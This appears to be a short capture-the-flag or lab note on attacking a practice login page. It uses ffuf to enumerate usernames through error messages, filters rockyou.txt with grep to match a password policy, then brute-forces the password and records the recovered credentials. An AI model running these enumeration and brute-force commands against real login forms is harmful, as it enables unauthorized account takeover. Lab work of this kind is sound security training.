___

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.60.36:44074/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=9vpru9k1j0215ggvufu2k67p3h" -d "username=FUZZ&password=test" -fr "Unknown username or password."
```

gladys

Password does not meet our password policy:

- Contains at least one digit
- Contains at least one lower-case character
- Contains at least one upper-case character
- Contains NO special characters
- Is exactly 12 characters long

```bash
grep '[[:digit:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  | grep '[[:lower:]]' \
  | grep '[[:upper:]]' \
  | grep -E '^[[:alnum:]]{12}$' > custom_wordlist.txt
```

```bash
ffuf -w custom_wordlist.txt -u http://94.237.60.36:44074/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=9vpru9k1j0215ggvufu2k67p3h" -d "username=gladys&password=FUZZ" -fr "Invalid credentials."
```

dWinaldasD13

http://94.237.60.36:44074/profile.php

![[Pasted image 20241008183808.png]]

